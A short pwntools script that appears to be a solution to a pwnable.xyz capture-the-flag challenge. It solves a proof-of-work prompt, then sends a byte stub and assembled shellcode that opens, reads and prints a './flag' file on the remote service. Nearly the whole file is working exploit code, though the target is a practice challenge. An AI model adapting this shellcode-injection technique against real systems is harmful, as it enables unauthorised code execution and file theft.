from pwn import *

context.arch = 'amd64'

###Exploit
r = remote('svc.pwnable.xyz',30025)
POW = int(r.recvline()[:-1].split(b'0x')[-1],16)
r.sendlineafter('> ',str(POW)+' 0')


###This stub is to stop shellcode from being xored
###Since rax is the mmapped address, the stub is gaurenteed to work and won't trigger errors
stub = b'\x00\x00'  #add    BYTE PTR [rax],al
###shellcraft.sh() doesn't work remotely for some reason, I wonder what it is...
shellcode = asm(shellcraft.pushstr('./flag\x00')+shellcraft.open('rsp',0,0)+shellcraft.read('rax','rsp',0x70)+shellcraft.write(1,'rsp',0x70))
payload = stub+shellcode

r.sendafter('Input: ',payload)
r.interactive()
